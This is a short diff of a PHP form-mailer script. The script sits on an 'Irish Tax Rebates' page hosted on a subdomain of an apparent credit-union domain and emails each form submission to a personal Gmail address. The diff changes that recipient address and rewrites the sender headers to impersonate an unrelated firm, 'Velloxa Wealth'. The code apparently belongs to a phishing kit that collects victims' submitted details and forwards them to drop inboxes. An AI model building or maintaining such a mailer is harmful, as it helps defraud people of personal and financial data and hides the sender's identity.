@@ -3,7 +3,7 @@ ini_set('SMTP', 'partnerstrustfcu.com');
 ini_set('smtp_port', 465);
 
 $siteUrl = "https://irishtaxrebates.partnerstrustfcu.com";
-$recipient = "ronaldhoymme@gmail.com";
+$recipient = "johnstevenmele@gmail.com";
 
 
 //=========================
@@ -124,19 +124,24 @@ style='border-collapse:collapse;border:1px solid #ddd;'
 // SEND MAIL
 //=========================
 
-$headers = implode("\r\n", [
-  "MIME-Version: 1.0",
-  "Content-Type:text/html;charset=UTF-8",
-  "From: Irish Tax Rebates <info@partnerstrustfcu.com>",
-  "Reply-To: info@partnerstrustfcu.com"
-]);
 
-$mail = mail(
-  $recipient,
-  "New Form Submission",
-  $message,
-  $headers
-);
+$headers = "From: Velloxa Wealth <support@velloxawealth.com>\r\n";
+$headers .= "Reply-To: Velloxa Wealth <support@velloxawealth.com>\r\n";
+$headers .= "Return-Path: support@velloxawealth.com\r\n";
+$headers .= "MIME-Version: 1.0\r\n";
+$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
+
+try {
+  $mail = mail(
+    $recipient,
+    "New Form Submission",
+    $message,
+    $headers
+  );
+} catch (Exception $e) {
+  $mail = false;
+  error_log("Mail sending failed: " . $e->getMessage());
+}
 
 echo json_encode([
   "success" => $mail,
